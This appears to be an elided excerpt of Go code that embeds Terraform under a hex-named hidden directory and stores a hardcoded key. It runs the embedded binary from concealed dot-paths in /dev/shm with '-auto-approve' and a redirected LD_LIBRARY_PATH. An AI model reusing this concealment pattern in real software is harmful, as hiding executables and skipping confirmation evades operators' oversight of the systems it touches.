...
//go:embed .74ae99a81bc9f7f97b018cef41f0d5c09996fdaca0292e2531b92408cfe04fd9c77cfa6bb3f45ea9698fbbab308c76fb999f3ef3c5c5491ee28585e6ab73fe62.lib/terraform
...
const hexKey = "6844866cf8263442bbb5038b29d8e664db4d615cda8219684aa306461fd90145"
...
//  changed here to a specific location or deleted to only use the system interpreter
    intPath := fmt.Sprintf("%s/5b923872a9b2222a83e920519624a1ef47d7fa36e6e26738e658b3844428ef47", "/dev/shm/.5b923872a9b2222a83e920519624a1ef47d7fa36e6e26738e658b3844428ef47")
...
parts = append(parts, "-auto-approve") // Interpreter flags injected here (or it's just this comment)
...
if needsFile {
        ...
        tmpPath = fmt.Sprintf("%s/2e3adf06aafb2fcf81cbe92e036e73b3ad6a4e7cd95fc59739b2931bf0ab2b9b", "/dev/shm/.2e3adf06aafb2fcf81cbe92e036e73b3ad6a4e7cd95fc59739b2931bf0ab2b9b/")
...
cmd := exec.Command(intPath, parts[1:]...)
    cmd.Env = append(os.Environ(), "LD_LIBRARY_PATH=./.74ae99a81bc9f7f97b018cef41f0d5c09996fdaca0292e2531b92408cfe04fd9c77cfa6bb3f45ea9698fbbab308c76fb999f3ef3c5c5491ee28585e6ab73fe62.lib")
